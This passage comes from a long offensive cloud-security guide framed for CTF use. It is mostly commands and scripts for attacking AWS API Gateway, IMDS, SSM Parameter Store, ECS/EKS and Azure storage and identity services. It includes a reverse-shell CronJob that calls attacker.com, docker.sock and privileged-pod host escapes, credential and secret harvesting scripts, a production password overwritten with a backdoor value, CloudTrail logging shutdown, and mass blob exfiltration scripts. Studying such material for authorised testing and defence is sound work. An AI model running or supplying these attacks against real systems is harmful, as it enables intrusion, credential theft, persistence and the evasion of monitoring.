# Test template injection in mapping templates
curl -X POST https://api.example.com/resource \
  -d '{"input":"$context.requestId"}'

# Velocity Template Language (VTL) injection
curl -X POST https://api.example.com/resource \
  -d '{"input":"#set($x=$context.identity.sourceIp)$x"}'

# Parameter pollution through mapping
curl "https://api.example.com/resource?param=value1&param=value2"
```

**Integration Request Manipulation**

```bash
# If HTTP integration, test SSRF
curl -X POST https://api.example.com/proxy \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# Lambda integration enumeration
# Trigger errors to reveal Lambda function names
curl https://api.example.com/resource/invalid-input

# Mock integration detection
curl -i https://api.example.com/mock-endpoint
# Look for specific mock response patterns
```

### Rate Limiting and Throttling Bypass

```bash
# Test rate limits
for i in {1..1000}; do
  curl -s -o /dev/null -w "%{http_code}\n" https://api.example.com/resource &
done | sort | uniq -c

# Header-based rate limit bypass
curl -H "X-Forwarded-For: $(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1).$(shuf -i 1-255 -n 1)" https://api.example.com/resource

# API key rotation to bypass limits
while read apikey; do
  curl -H "x-api-key: $apikey" https://api.example.com/resource
done < api-keys.txt
```

### WebSocket API Testing

```bash
# Connect to WebSocket API
wscat -c "wss://API_ID.execute-api.region.amazonaws.com/prod"

# Test route selection
# Send messages with different actions/routes
{"action":"$connect"}
{"action":"sendMessage","data":"test"}
{"action":"$disconnect"}

# Authorization testing
wscat -c "wss://API_ID.execute-api.region.amazonaws.com/prod" -H "Authorization: Bearer token"

# Python WebSocket testing
python3 << 'EOF'
import websocket
import json

ws = websocket.create_connection("wss://API_ID.execute-api.region.amazonaws.com/prod")
ws.send(json.dumps({"action":"test","data":"payload"}))
print(ws.recv())
ws.close()
EOF
```

### API Gateway Logging and Monitoring Evasion

**CloudWatch Logs Analysis**

```bash
# Check if API logging is enabled
aws apigateway get-stage --rest-api-id API_ID --stage-name prod --query 'accessLogSettings'

# If logs exist, analyze for patterns
aws logs filter-log-events \
  --log-group-name API-Gateway-Execution-Logs_API_ID/prod \
  --filter-pattern "401" \
  --limit 50
```

**X-Ray Tracing Detection**

```bash
# Check if X-Ray tracing is enabled
aws apigateway get-stage --rest-api-id API_ID --stage-name prod --query 'tracingEnabled'

# Test with X-Ray propagation headers
curl -H "X-Amzn-Trace-Id: Root=1-67890-abc" https://api.example.com/resource
```

### Mass Assignment and Parameter Pollution

```bash
# Test additional parameters not in documentation
curl -X POST https://api.example.com/users \
  -d '{"username":"test","email":"test@example.com","role":"admin","isActive":true}'

# Array parameter injection
curl "https://api.example.com/resource?ids[]=1&ids[]=2&ids[]=../../../etc/passwd"

# Nested object manipulation
curl -X POST https://api.example.com/resource \
  -d '{"user":{"name":"test","privileges":{"admin":true}}}'
```

### Tools for API Gateway Testing

```bash
# Burp Suite API scan
# Configure proxy and use built-in API scanner

# OWASP ZAP automated scan
zap-cli quick-scan -s xss,sqli https://api.example.com

# API fuzzing with ffuf
ffuf -w api-wordlist.txt -u https://api.example.com/FUZZ -mc 200,201,204

# Automated API testing with Postman/Newman
newman run api-collection.json -e environment.json

# API Gateway-specific scanner (custom)
python3 << 'EOF'
import requests
import sys

base_url = "https://API_ID.execute-api.region.amazonaws.com/prod"
endpoints = ["/users", "/admin", "/api/v1", "/api/v2"]

for endpoint in endpoints:
    for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]:
        try:
            r = requests.request(method, base_url + endpoint, timeout=5)
            print(f"{method} {endpoint}: {r.status_code}")
        except:
            pass
EOF
```

**Important Note:** [Unverified] Many API Gateway misconfigurations stem from overly permissive resource policies, disabled authorization, or improper CORS configurations. Always verify findings in your specific testing environment as AWS configurations vary significantly between deployments.

---

## AWS Credential Discovery

### Credential Storage Locations

**Linux EC2 Instances:**

```bash
# Instance Metadata Service (IMDSv1)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 (session-based)
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# User data (may contain credentials)
curl http://169.254.169.254/latest/user-data
```

**Windows EC2 Instances:**

```powershell
# PowerShell IMDSv1
Invoke-RestMethod -Uri http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2
$token = Invoke-RestMethod -Headers @{"X-aws-ec2-metadata-token-ttl-seconds" = "21600"} -Method PUT -Uri http://169.254.169.254/latest/api/token
Invoke-RestMethod -Headers @{"X-aws-ec2-metadata-token" = $token} -Uri http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Filesystem Credential Locations:**

```bash
# AWS CLI credentials (Linux/macOS)
~/.aws/credentials
~/.aws/config

# Windows
%USERPROFILE%\.aws\credentials
%USERPROFILE%\.aws\config

# Environment variables
echo $AWS_ACCESS_KEY_ID
echo $AWS_SECRET_ACCESS_KEY
echo $AWS_SESSION_TOKEN

# Application-specific locations
/var/www/html/config.php
/opt/app/application.properties
~/.bash_history | grep -i aws
~/.zsh_history | grep -i aws

# Docker container credentials
docker inspect <container_id> | grep -i aws

# Check processes for credentials
ps auxwwe | grep -i aws
```

### Automated Credential Discovery Tools

**Pacu - AWS Exploitation Framework:**

```bash
# Installation
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
bash install.sh

# Usage
python3 pacu.py
set_keys
import_keys <profile_name>

# Enumerate all credentials
run iam__enum_permissions
run iam__enum_users_roles_policies_groups

# Bruteforce permission enumeration
run iam__bruteforce_permissions
```

**WeirdAAL - AWS Attack Library:**

```bash
git clone https://github.com/carnal0wnage/weirdAAL.git
cd weirdAAL
python3 -m pip install -r requirements.txt

# Create config
cp env.sample .env

# Enumerate services
python3 weirdAAL.py -m recon_all -t <profile>
```

**ScoutSuite - Multi-Cloud Auditing:**

```bash
pip install scoutsuite

# Run assessment
scout aws --profile <profile_name>
scout aws --access-key-id <key> --secret-access-key <secret>

# Generate HTML report (browser-based review)
```

**aws-enum - Lightweight Enumerator:**

```bash
git clone https://github.com/dagrz/aws_pwn.git
cd aws_pwn

# Enumerate with found credentials
python3 enum_workload.py --access-key <key> --secret-key <secret>
```

### Manual Enumeration Commands

**Identity Verification:**

```bash
# Determine who you are
aws sts get-caller-identity

# Get account information
aws sts get-caller-identity --query Account --output text

# Assume role (if permissions exist)
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/RoleName --role-session-name test
```

**IAM Enumeration:**

```bash
# List users
aws iam list-users

# List roles
aws iam list-roles

# Get user policies
aws iam list-user-policies --user-name <username>
aws iam list-attached-user-policies --user-name <username>

# Get role policies
aws iam list-role-policies --role-name <rolename>
aws iam list-attached-role-policies --role-name <rolename>

# Get policy document
aws iam get-policy --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <version>

# List access keys
aws iam list-access-keys --user-name <username>
```

**Service Enumeration:**

```bash
# S3 buckets
aws s3 ls
aws s3 ls s3://<bucket-name> --recursive

# EC2 instances
aws ec2 describe-instances
aws ec2 describe-security-groups
aws ec2 describe-snapshots --owner-ids self

# Lambda functions
aws lambda list-functions
aws lambda get-function --function-name <name>

# RDS databases
aws rds describe-db-instances
aws rds describe-db-snapshots

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <name>
```

### Credential Theft Techniques

**SSRF to IMDS:**

```bash
# If application has SSRF vulnerability
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# IMDSv2 bypass attempts (requires PUT request)
# Some applications may allow different HTTP methods
```

**Container Escape to Host Credentials:**

```bash
# Check if running in container
cat /proc/1/cgroup

# Mount host filesystem (if privileged)
mkdir /mnt/host
mount /dev/sda1 /mnt/host
cat /mnt/host/root/.aws/credentials

# Access host IMDS if networking allows
curl http://169.254.169.254/latest/meta-data/
```

**Lambda Function Credential Extraction:**

```bash
# Lambda environment variables
aws lambda get-function-configuration --function-name <name>

# Download function code
aws lambda get-function --function-name <name> --query 'Code.Location' --output text | xargs wget -O function.zip
unzip function.zip
grep -r "AWS" .
```

---

## SSM Parameter Store Enumeration

### Parameter Store Overview

AWS Systems Manager Parameter Store stores configuration data and secrets. Parameters can be String, StringList, or SecureString (encrypted with KMS).

### Basic Enumeration

**List Parameters:**

```bash
# List all parameters (names only)
aws ssm describe-parameters

# List parameters with metadata
aws ssm describe-parameters --output json

# Filter by path prefix
aws ssm describe-parameters --parameter-filters "Key=Name,Option=BeginsWith,Values=/prod/"

# Maximum results per query (pagination)
aws ssm describe-parameters --max-results 50 --next-token <token>
```

**Get Parameter Values:**

```bash
# Get single parameter (plain text)
aws ssm get-parameter --name <parameter-name>

# Get parameter with decryption (SecureString)
aws ssm get-parameter --name <parameter-name> --with-decryption

# Get multiple parameters
aws ssm get-parameters --names <param1> <param2> <param3> --with-decryption

# Get all parameters by path
aws ssm get-parameters-by-path --path /application/ --recursive --with-decryption

# Get parameter history
aws ssm get-parameter-history --name <parameter-name>
```

### Automated Parameter Store Extraction

**Pacu Module:**

```bash
# In Pacu session
run ssm__enum_parameters

# Extract all readable parameters
run ssm__download_parameters --with-decryption
```

**Custom Bash Script:**

```bash
#!/bin/bash
# Extract all SSM parameters

# Get all parameter names
PARAMS=$(aws ssm describe-parameters --query 'Parameters[*].Name' --output text)

# Loop through and extract values
for param in $PARAMS; do
    echo "Parameter: $param"
    aws ssm get-parameter --name "$param" --with-decryption --query 'Parameter.Value' --output text 2>/dev/null
    echo "---"
done
```

**Python Automation:**

```python
import boto3

def enumerate_ssm_parameters(profile_name=None):
    session = boto3.Session(profile_name=profile_name)
    ssm = session.client('ssm')
    
    parameters = []
    paginator = ssm.get_paginator('describe_parameters')
    
    for page in paginator.paginate():
        for param in page['Parameters']:
            param_name = param['Name']
            try:
                response = ssm.get_parameter(
                    Name=param_name,
                    WithDecryption=True
                )
                parameters.append({
                    'Name': param_name,
                    'Value': response['Parameter']['Value'],
                    'Type': response['Parameter']['Type']
                })
                print(f"[+] {param_name}: {response['Parameter']['Value']}")
            except Exception as e:
                print(f"[-] {param_name}: {str(e)}")
    
    return parameters

# Usage
enumerate_ssm_parameters('default')
```

### Privilege Escalation via Parameter Store

**Common Misconfigurations:**

[Inference] Organizations may grant overly permissive IAM policies allowing parameter access.

```bash
# Check your IAM permissions
aws iam simulate-principal-policy \
    --policy-source-arn arn:aws:iam::123456789012:user/username \
    --action-names ssm:GetParameter ssm:GetParameters ssm:GetParametersByPath

# Common IAM policy mistakes
# - ssm:* on all resources
# - ssm:GetParameter with wildcard resource
# - Condition keys not enforced
```

**Create/Modify Parameters (if permissions exist):**

```bash
# Create new parameter
aws ssm put-parameter --name /exploit/test --value "attacker-data" --type String

# Overwrite existing parameter
aws ssm put-parameter --name /prod/db/password --value "backdoor123" --overwrite

# Add labels to parameters
aws ssm label-parameter-version --name <param> --parameter-version <version> --labels exploit
```

### Parameter Store + KMS Interaction

**KMS Key Enumeration:**

```bash
# List KMS keys
aws kms list-keys

# Get key policy
aws kms get-key-policy --key-id <key-id> --policy-name default

# Decrypt SecureString if you have kms:Decrypt permission
aws ssm get-parameter --name <param> --with-decryption
```

**Bypass Attempts:**

[Inference] If `ssm:GetParameter` is allowed but KMS decrypt is blocked, you cannot read SecureString values.

```bash
# Get encrypted value (without decryption)
aws ssm get-parameter --name <param>

# Attempt KMS decrypt directly
aws kms decrypt --ciphertext-blob fileb://encrypted.txt
```

---

## ECS/EKS Container Security

### ECS (Elastic Container Service) Enumeration

**Cluster and Service Discovery:**

```bash
# List ECS clusters
aws ecs list-clusters

# Describe cluster
aws ecs describe-clusters --clusters <cluster-name>

# List services in cluster
aws ecs list-services --cluster <cluster-name>

# Describe service
aws ecs describe-services --cluster <cluster-name> --services <service-name>

# List tasks
aws ecs list-tasks --cluster <cluster-name>

# Describe task
aws ecs describe-tasks --cluster <cluster-name> --tasks <task-arn>

# List task definitions
aws ecs list-task-definitions

# Describe task definition (includes secrets, environment variables)
aws ecs describe-task-definition --task-definition <task-def-name>
```

**Extract Secrets from Task Definitions:**

```bash
# Get task definition with secrets
aws ecs describe-task-definition --task-definition <task-def> --query 'taskDefinition.containerDefinitions[*].secrets'

# Common secret storage methods in ECS:
# - Secrets Manager ARNs
# - SSM Parameter Store references
# - Environment variables (plaintext)

# Example output parsing
aws ecs describe-task-definition --task-definition app-task | jq '.taskDefinition.containerDefinitions[].environment'
```

**ECS Container Credential Theft:**

When inside an ECS container:

```bash
# ECS task role credentials (environment variables)
echo $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# Retrieve credentials
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# Full credential extraction
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | jq
```

### ECS Security Misconfigurations

**Privileged Container Check:**

```bash
# Check if container runs privileged
aws ecs describe-task-definition --task-definition <task-def> | grep -i privileged
```

**Exposed Docker Socket:**

```bash
# Inside container, check for docker.sock
ls -la /var/run/docker.sock

# If present, escape to host
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host bash
```

**Network Mode Issues:**

```bash
# Host network mode exposes all host interfaces
aws ecs describe-task-definition --task-definition <task-def> | grep networkMode

# networkMode: "host" allows access to host networking
```

### EKS (Elastic Kubernetes Service) Enumeration

**Cluster Discovery:**

```bash
# List EKS clusters
aws eks list-clusters

# Describe cluster
aws eks describe-cluster --name <cluster-name>

# Get kubeconfig
aws eks update-kubeconfig --name <cluster-name> --region <region>

# Verify access
kubectl auth can-i --list
```

**Kubernetes Reconnaissance:**

```bash
# List namespaces
kubectl get namespaces

# List pods
kubectl get pods --all-namespaces

# List services
kubectl get services --all-namespaces

# List secrets
kubectl get secrets --all-namespaces

# Describe pod (check for secrets, service accounts)
kubectl describe pod <pod-name> -n <namespace>

# Get pod service account token
kubectl get pod <pod-name> -n <namespace> -o jsonpath='{.spec.serviceAccountName}'
```

**Extract Secrets:**

```bash
# Get secret value
kubectl get secret <secret-name> -n <namespace> -o json

# Decode base64 secret
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data.password}' | base64 -d

# Extract all secrets in namespace
kubectl get secrets -n <namespace> -o json | jq '.items[].data'
```

### Kubernetes Container Escape Techniques

**Service Account Token Access:**

```bash
# Inside Kubernetes pod
# Service account token location
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token to authenticate
KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $KUBE_TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods --insecure
```

**Privileged Pod Escape:**

```bash
# Check if running privileged
cat /proc/self/status | grep CapEff

# If privileged, mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Access host containerd/docker socket
ls -la /run/containerd/containerd.sock
ls -la /var/run/docker.sock
```

**hostPath Volume Access:**

```bash
# Check for hostPath mounts
mount | grep /host

# Common sensitive hostPath mounts:
# - /var/log (access logs)
# - /etc (configuration files)
# - /root/.aws (AWS credentials)
# - / (full host filesystem)
```

### EKS-Specific Attack Vectors

**IRSA (IAM Roles for Service Accounts) Exploitation:**

```bash
# Inside pod with IRSA
# Environment variables
echo $AWS_ROLE_ARN
echo $AWS_WEB_IDENTITY_TOKEN_FILE

# Token location
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token

# Use token to assume role
aws sts assume-role-with-web-identity \
    --role-arn $AWS_ROLE_ARN \
    --role-session-name exploit \
    --web-identity-token file://$AWS_WEB_IDENTITY_TOKEN_FILE
```

**EKS Cluster Access Control:**

```bash
# Check aws-auth ConfigMap (defines IAM to RBAC mapping)
kubectl get configmap aws-auth -n kube-system -o yaml

# Misconfiguration: overly permissive IAM users/roles
# Look for "system:masters" group assignments
```

### Container Security Tools

**kube-hunter - Kubernetes Penetration Testing:**

```bash
# Installation
pip install kube-hunter

# Run in pod mode (from inside cluster)
kube-hunter --pod

# Remote scan
kube-hunter --remote <cluster-ip>
```

**kubectl-who-can - RBAC Analysis:**

```bash
# Installation
kubectl krew install who-can

# Check who can perform actions
kubectl who-can get secrets
kubectl who-can create pods
kubectl who-can get secrets -n kube-system
```

**Peirates - Kubernetes Penetration Testing:**

```bash
git clone https://github.com/inguardians/peirates.git
cd peirates
./peirates

# Interactive menu for:
# - Service account token extraction
# - AWS credential harvesting
# - Privilege escalation
```

**Trivy - Container Vulnerability Scanner:**

```bash
# Scan container image
trivy image <image-name>

# Scan running container
trivy container <container-id>

# Scan Kubernetes cluster
trivy k8s --report summary cluster
```

### ECS/EKS Persistence Mechanisms

**ECS Task Definition Backdoor:**

```bash
# Modify task definition to include backdoor container
aws ecs register-task-definition --cli-input-json file://backdoor-task.json

# Update service to use backdoored task definition
aws ecs update-service --cluster <cluster> --service <service> --task-definition <backdoor-task>
```

**Kubernetes CronJob Backdoor:**

```bash
# Create malicious CronJob
kubectl create cronjob backdoor --image=attacker/image --schedule="*/5 * * * *" -- /bin/sh -c "bash -i >& /dev/tcp/attacker.com/443 0>&1"
```

### Defense Evasion

**CloudTrail Log Suppression:**

[Inference] Attackers may attempt to disable logging, though this typically requires elevated permissions.

```bash
# Check CloudTrail status
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name <trail-name>

# Disable logging (requires cloudtrail:StopLogging)
aws cloudtrail stop-logging --name <trail-name>
```

**GuardDuty Evasion:**

[Inference] GuardDuty detection may be triggered by specific API calls or network behaviors.

```bash
# Check GuardDuty status
aws guardduty list-detectors
aws guardduty get-detector --detector-id <id>

# Common evasion techniques:
# - Slow, distributed API calls
# - Use of legitimate AWS services
# - Short-lived credentials
```

---

## Key CTF Methodologies

1. **Initial Access**: Always check IMDS (169.254.169.254) first when on AWS infrastructure
2. **Credential Priority**: IAM roles > Access keys > Environment variables > Config files
3. **Service Account Tokens**: In containers, check `/var/run/secrets` for both AWS and Kubernetes tokens
4. **Enumeration Order**: Identity → Permissions → Resources → Secrets
5. **Privilege Escalation**: Look for overly permissive IAM policies, privileged containers, and exposed management interfaces

## Important Security Notes

[Inference] The techniques described may require specific IAM permissions. Actual exploitation success depends on target configuration and security controls. Always operate within authorized scope during CTF events.

---

# Azure Security Testing

## Azure Blob Storage Enumeration

Azure Blob Storage is Microsoft's object storage solution. Storage accounts contain containers (similar to S3 buckets), which hold blobs (files). Misconfigurations frequently expose sensitive data.

### Storage Account Naming and Structure

**Naming constraints:**

- 3-24 characters
- Lowercase letters and numbers only
- Globally unique across all Azure
- Format: `https://<storage-account-name>.blob.core.windows.net/`

**Common naming patterns:**

- `companyname` / `companynamestorage` / `companystg`
- `companynamebackup` / `companybackup`
- `companynameprod` / `companyprod` / `companynamestaging`
- `companynamedata` / `companydata`
- `companynamelogs` / `companylogs`
- `companynamefiles` / `companyfiles`
- `companynamepublic` / `companypublic`
- `companynamesql` / `companyvmimages`

### Anonymous Storage Account Discovery

**Method 1: Direct HTTP enumeration**

```bash
# Test if storage account exists
curl -I https://targetaccount.blob.core.windows.net/
# 400 Bad Request with "Server: Windows-Azure-Blob/1.0" = exists
# Other errors = does not exist

# Alternative endpoints to test
curl -I https://targetaccount.blob.core.windows.net/?comp=list
curl -I https://targetaccount.blob.core.windows.net/?restype=service&comp=properties

# Check other storage services on same account
curl -I https://targetaccount.file.core.windows.net/      # File shares
curl -I https://targetaccount.queue.core.windows.net/     # Queue storage
curl -I https://targetaccount.table.core.windows.net/     # Table storage
curl -I https://targetaccount.dfs.core.windows.net/       # Data Lake Gen2
```

**Method 2: Container enumeration (anonymous listing)**

```bash
# Attempt to list containers (requires account-level public access)
curl https://targetaccount.blob.core.windows.net/?comp=list

# Common container names to test
containers=(
    "backup" "backups" "data" "files" "images" "documents" "logs"
    "public" "private" "www" "web" "assets" "uploads" "downloads"
    "temp" "tmp" "archive" "reports" "exports" "imports"
    "prod" "production" "staging" "dev" "development" "test"
    "sql" "database" "db-backup" "vm-images" "vhd" "vhds"
)

for container in "${containers[@]}"; do
    echo "[*] Testing container: $container"
    curl -I "https://targetaccount.blob.core.windows.net/$container?restype=container"
done
```

**Method 3: Blob enumeration within containers**

```bash
# List blobs in container (if container-level public access enabled)
curl "https://targetaccount.blob.core.windows.net/containername?restype=container&comp=list"

# Recursive listing with marker for pagination
curl "https://targetaccount.blob.core.windows.net/containername?restype=container&comp=list&maxresults=5000"

# Download specific blob
curl "https://targetaccount.blob.core.windows.net/containername/blobname.txt" -o blobname.txt

# Get blob metadata
curl -I "https://targetaccount.blob.core.windows.net/containername/blobname.txt"
```

### Access Level Understanding

Azure Blob Storage has three access levels:

**1. Private (default):**

- No anonymous access
- Requires authentication for all operations

**2. Blob (anonymous read for blobs):**

- Blobs can be read anonymously if full URL is known
- Container cannot be listed anonymously
- Common misconfiguration: "security by obscurity"

**3. Container (anonymous read for container and blobs):**

- Container contents can be listed anonymously
- All blobs can be read anonymously
- Most dangerous configuration

```bash
# Test access levels
# If listing works, container-level access is enabled
curl "https://targetaccount.blob.core.windows.net/containername?restype=container&comp=list"

# If direct blob access works but listing doesn't, blob-level access enabled
curl "https://targetaccount.blob.core.windows.net/containername/known-file.txt"
```

### Automated Storage Enumeration Tools

**Using MicroBurst (PowerShell-based Azure toolkit):**

```powershell
# Install MicroBurst
git clone https://github.com/NetSPI/MicroBurst
Import-Module .\MicroBurst\MicroBurst.psm1

# Enumerate storage accounts with wordlist
Invoke-EnumerateAzureBlobs -Base company -OutputFile storage-results.txt

# Permutation-based enumeration
Invoke-EnumerateAzureBlobs -Base company -Permutations -OutputFile storage-permutations.txt
```

**Using cloud_enum:**

```bash
git clone https://github.com/initstring/cloud_enum
cd cloud_enum
pip3 install -r requirements.txt

# Azure-specific enumeration
python3 cloud_enum.py -k company-name -k companyname --azure

# Specify custom keyword file
python3 cloud_enum.py -kf keywords.txt --azure

# Increase threading for faster results
python3 cloud_enum.py -k company-name --azure -t 50
```

**Using azurite:**

```bash
# Storage account enumeration tool
npm install -g azurite

# [Unverified] Tool usage varies by version - check documentation
```

**Custom enumeration script:**

```bash
#!/bin/bash
# Azure storage account brute-forcer

BASE="$1"
WORDLIST="$2"

if [ -z "$BASE" ] || [ -z "$WORDLIST" ]; then
    echo "Usage: $0 <base-keyword> <wordlist>"
    exit 1
fi

echo "[+] Starting Azure Blob Storage enumeration for: $BASE"

# Generate storage account name candidates
cat "$WORDLIST" | while read word; do
    echo "${BASE}${word}"
    echo "${word}${BASE}"
    echo "${BASE}${word}storage"
    echo "${BASE}${word}data"
done | sort -u | tr '[:upper:]' '[:lower:]' | grep -E '^[a-z0-9]{3,24}$' > candidates.txt

# Test each candidate
cat candidates.txt | while read account; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "https://${account}.blob.core.windows.net/" 2>/dev/null)
    
    if [ "$response" == "400" ]; then
        echo "[+] Found storage account: $account"
        echo "$account" >> found-accounts.txt
        
        # Test for public container listing
        list_response=$(curl -s "https://${account}.blob.core.windows.net/?comp=list")
        if echo "$list_response" | grep -q "<Containers>"; then
            echo "[!] ALERT: Account $account allows public container listing!"
            echo "$account - PUBLIC LISTING" >> high-value-targets.txt
        fi
    fi
done

echo "[+] Enumeration complete. Found accounts in: found-accounts.txt"
```

### Authenticated Storage Enumeration

When credentials are available (connection strings, SAS tokens, or Azure AD authentication):

**Using Azure CLI:**

```bash
# Authenticate
az login
# Or use service principal
az login --service-principal -u <app-id> -p <password> --tenant <tenant-id>

# List all storage accounts (requires subscription-level read access)
az storage account list --output table

# Get storage account keys (requires contributor/higher role)
az storage account keys list --account-name targetaccount --resource-group rgname

# List containers in account
az storage container list --account-name targetaccount --output table

# List containers with authentication
az storage container list --account-name targetaccount --account-key <key>

# List blobs in container
az storage blob list --container-name containername --account-name targetaccount --output table

# Download blob
az storage blob download --container-name containername --name blobname.txt --file output.txt --account-name targetaccount

# Download entire container
az storage blob download-batch --destination ./local-folder --source containername --account-name targetaccount
```

**Using Azure Storage Explorer (GUI):**

- Supports SAS tokens, connection strings, and Azure AD authentication
- URL: https://azure.microsoft.com/en-us/products/storage/storage-explorer/

**Using AzCopy:**

```bash
# Install azcopy
wget https://aka.ms/downloadazcopy-v10-linux
tar -xvf downloadazcopy-v10-linux
sudo mv azcopy_linux_amd64_*/azcopy /usr/local/bin/

# Copy with SAS token
azcopy copy "https://targetaccount.blob.core.windows.net/container?<SAS-token>" "./local-folder" --recursive

# Copy with account key
azcopy copy "https://targetaccount.blob.core.windows.net/container" "./local-folder" --recursive

# List containers
azcopy list "https://targetaccount.blob.core.windows.net?<SAS-token>"
```

### Shared Access Signature (SAS) Token Analysis

SAS tokens provide delegated access to Azure Storage without sharing account keys. They contain permissions, expiry, and scope encoded in the URL.

**SAS token structure:**

```
https://targetaccount.blob.core.windows.net/container/blob?
sv=2021-06-08&          # Storage service version
ss=b&                   # Service: blob
srt=sco&                # Resource types: service, container, object
sp=rwdlac&              # Permissions: read, write, delete, list, add, create
se=2025-12-31T23:59:59Z&  # Expiry time
st=2025-01-01T00:00:00Z&  # Start time
spr=https&              # Protocol: HTTPS only
sig=<signature>         # Signature hash
```

**Permission analysis:**

```bash
# Extract SAS parameters from URL
echo "https://account.blob.core.windows.net/container?sv=2021-06-08&sp=rl&se=2026-01-01" | grep -oP 'sp=\K[^&]*'

# Common permission values:
# r = read
# a = add
# c = create
# w = write
# d = delete
# l = list
# t = tag
# x = delete versions
```

**SAS token testing:**

```bash
# Test read permission
curl "https://targetaccount.blob.core.windows.net/container/test.txt?<SAS-token>"

# Test write permission (requires w or c)
echo "test content" > upload.txt
curl -X PUT -H "x-ms-blob-type: BlockBlob" --data-binary @upload.txt \
  "https://targetaccount.blob.core.windows.net/container/testfile.txt?<SAS-token>"

# Test delete permission
curl -X DELETE "https://targetaccount.blob.core.windows.net/container/testfile.txt?<SAS-token>"

# Test list permission
curl "https://targetaccount.blob.core.windows.net/container?restype=container&comp=list&<SAS-token>"
```

**Account-level SAS vs Service-level SAS:**

- **Service SAS:** Limited to specific service (blob, file, queue, table)
- **Account SAS:** Can access multiple services and account-level operations

### Storage Account Key Exposure

Storage account keys provide full access to the storage account. Common exposure points:

**1. Application configuration files:**

```bash
# Search for connection strings in config files
grep -r "DefaultEndpointsProtocol=https" .
grep -r "AccountKey=" .
grep -r "core.windows.net" .

# Common files to check
cat appsettings.json | grep -i "connection\|storage\|azure"
cat web.config | grep -i "connection\|storage"
cat .env | grep -i "azure\|storage"
```

**2. Source code repositories:**

```bash
# GitHub/GitLab search queries
"DefaultEndpointsProtocol" "AccountName" "AccountKey"
"core.windows.net" "AccountKey"
".blob.core.windows.net" extension:json
".blob.core.windows.net" extension:config

# TruffleHog for secrets in git history
trufflehog git https://github.com/target/repo --only-verified

# Gitleaks
gitleaks detect --source . --verbose
```

**3. Environment variables and memory:**

```bash
# On compromised systems
env | grep -i azure
cat /proc/*/environ | grep -i azure

# In container environments
docker inspect <container-id> | grep -i azure
kubectl get secrets --all-namespaces
```

**Connection string format:**

```
DefaultEndpointsProtocol=https;
AccountName=storageaccount;
AccountKey=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==;
EndpointSuffix=core.windows.net
```

### Data Exfiltration Techniques

**Recursive download with error handling:**

```bash
#!/bin/bash
# Mass download from Azure Blob Storage

ACCOUNT="$1"
CONTAINER="$2"
OUTPUT_DIR="$3"

mkdir -p "$OUTPUT_DIR"

# Get blob list
curl -s "https://${ACCOUNT}.blob.core.windows.net/${CONTAINER}?restype=container&comp=list" | \
  grep -oP '(?<=<Name>)[^<]+' | while read blob; do
    
    # Create directory structure
    dir=$(dirname "$blob")
    mkdir -p "$OUTPUT_DIR/$dir"
    
    # Download blob
    echo "[+] Downloading: $blob"
    curl -s "https://${ACCOUNT}.blob.core.windows.net/${CONTAINER}/${blob}" \
      -o "$OUTPUT_DIR/$blob"
done

echo "[+] Download complete: $OUTPUT_DIR"
```

**Targeting high-value files:**

```bash
# Search for sensitive file patterns
curl -s "https://account.blob.core.windows.net/container?restype=container&comp=list" | \
  grep -oP '(?<=<Name>)[^<]+' | grep -E '\.(sql|bak|backup|config|json|xml|key|pem|p12|pfx|env)$'

# Download only database backups
curl -s "https://account.blob.core.windows.net/container?restype=container&comp=list" | \
  grep -oP '(?<=<Name>)[^<]+' | grep -iE '\.(sql|bak|bacpac)$' | while read file; do
    curl "https://account.blob.core.windows.net/container/$file" -o "$file"
done
```

## Azure AD Reconnaissance

Azure Active Directory (Entra ID) is Microsoft's cloud-based identity and access management service. Reconnaissance focuses on enumerating users, groups, applications, and permissions.

### Tenant Discovery

Every Azure AD tenant has a unique tenant ID (GUID) and one or more verified domains.

**Method 1: OpenID Connect discovery:**

```bash
# Discover tenant information from domain
curl -s "https://login.microsoftonline.com/company.com/.well-known/openid-configuration" | jq .

# Extract tenant ID
curl -s "https://login.microsoftonline.com/company.com/.well-known/openid-configuration" | jq -r '.token_endpoint' | grep -oP '[a-f0-9-]{36}'

# Alternative endpoint
curl -s "https://login.microsoftonline.com/company.com/v2.0/.well-known/openid-configuration" | jq .
```

**Method 2: Using AADInternals (PowerShell):**

```powershell
# Install AADInternals
Install-Module AADInternals -Force

# Get tenant information
Get-AADIntTenantID -Domain company.com

# Get tenant details
Get-AADIntTenantDomains -Domain company.com

# Get login information (branding, federation, etc.)
Get-AADIntLoginInformation -Domain company.com

# Invoke-AADIntReconAsOutsider discovers extensive tenant information
Invoke-AADIntReconAsOutsider -Domain company.com
```

**Method 3: Undocumented Microsoft APIs:**

```bash
# Get tenant information (legacy API)
